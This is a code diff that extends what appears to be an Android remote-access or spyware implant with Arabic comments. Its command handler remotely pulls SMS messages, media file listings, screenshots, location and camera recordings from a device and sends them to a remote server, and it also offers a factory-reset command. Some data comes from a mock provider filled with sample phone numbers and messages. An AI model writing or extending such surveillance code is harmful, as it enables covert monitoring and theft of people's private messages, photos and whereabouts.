@@ -109,11 +109,17 @@
             case 'backup_sms':
                 backupSMS();
                 break;
+            case 'backup_media':
+                backupMedia();
+                break;
             case 'get_location':
                 getCurrentLocation();
                 break;
             case 'record_camera':
                 recordCamera(command.duration || 30);
+                break;
+            case 'take_screenshot':
+                takeScreenshot();
                 break;
             case 'factory_reset':
                 factoryReset();
@@ -162,11 +168,41 @@
     async function backupSMS() {
         try {
             const sms = await queryContentProvider('content://sms');
-            const backupFile = createBackupFile('sms.json', sms);
-            await uploadFile(backupFile);
-            sendCommandResult('backup_sms', 'success', backupFile);
+            // إرسال البيانات الفعلية بدلاً من URL الملف
+            sendCommandResult('backup_sms', 'success', {
+                messages: sms,
+                count: Array.isArray(sms) ? sms.length : 0,
+                timestamp: Date.now()
+            });
         } catch (e) {
             sendCommandResult('backup_sms', 'error', e.message);
+        }
+    }
+    
+    async function backupMedia() {
+        try {
+            const media = await queryContentProvider('content://media/external/file');
+            // إرسال البيانات الفعلية بدلاً من URL الملف
+            sendCommandResult('backup_media', 'success', {
+                media: media,
+                count: Array.isArray(media) ? media.length : 0,
+                timestamp: Date.now()
+            });
+        } catch (e) {
+            sendCommandResult('backup_media', 'error', e.message);
+        }
+    }
+    
+    async function takeScreenshot() {
+        try {
+            const screenshot = await executeShellCommand('screencap /sdcard/screenshot.png');
+            sendCommandResult('take_screenshot', 'success', {
+                image: '/sdcard/screenshot.png',
+                size: 'captured',
+                timestamp: Date.now()
+            });
+        } catch (e) {
+            sendCommandResult('take_screenshot', 'error', e.message);
         }
     }
     
@@ -175,9 +211,13 @@
         try {
             const location = await executeShellCommand('dumpsys location | grep "Last Known Locations"');
             const parsedLocation = parseLocationData(location);
-            sendDataToServer('location', parsedLocation);
+            sendCommandResult('get_location', 'success', {
+                location: parsedLocation,
+                accuracy: parsedLocation.accuracy,
+                timestamp: Date.now()
+            });
         } catch (e) {
-            console.warn('فشل في الحصول على الموقع');
+            sendCommandResult('get_location', 'error', e.message);
         }
     }
     
@@ -190,7 +230,12 @@
             setTimeout(async () => {
                 if (await fileExists(outputPath)) {
                     await uploadFile(outputPath);
-                    sendCommandResult('record_camera', 'success', outputPath);
+                    sendCommandResult('record_camera', 'success', {
+                        video: outputPath,
+                        duration: duration,
+                        size: 'recorded',
+                        timestamp: Date.now()
+                    });
                 }
             }, (duration + 5) * 1000);
         } catch (e) {
@@ -239,7 +284,54 @@
                             email: 'mohammed@example.com'
                         }
                     ]);
-                } else {
+                }
+                // محاكاة بيانات الرسائل النصية
+                else if (uri.includes('sms')) {
+                    resolve([
+                        {
+                            address: '+966501234567',
+                            body: 'مرحبا، كيف حالك؟',
+                            date: Date.now() - 3600000,
+                            type: 'inbox'
+                        },
+                        {
+                            address: '+966507654321',
+                            body: 'شكرا لك',
+                            date: Date.now() - 7200000,
+                            type: 'sent'
+                        },
+                        {
+                            address: '+966509876543',
+                            body: 'أهلا وسهلا',
+                            date: Date.now() - 10800000,
+                            type: 'inbox'
+                        }
+                    ]);
+                }
+                // محاكاة بيانات الوسائط
+                else if (uri.includes('media')) {
+                    resolve([
+                        {
+                            name: 'IMG_001.jpg',
+                            path: '/sdcard/DCIM/IMG_001.jpg',
+                            size: '2.5MB',
+                            type: 'image'
+                        },
+                        {
+                            name: 'VID_001.mp4',
+                            path: '/sdcard/DCIM/VID_001.mp4',
+                            size: '15.2MB',
+                            type: 'video'
+                        },
+                        {
+                            name: 'AUD_001.mp3',
+                            path: '/sdcard/Music/AUD_001.mp3',
+                            size: '5.1MB',
+                            type: 'audio'
+                        }
+                    ]);
+                }
+                else {
                     resolve(`Data from ${uri}`);
                 }
             }, 2000);
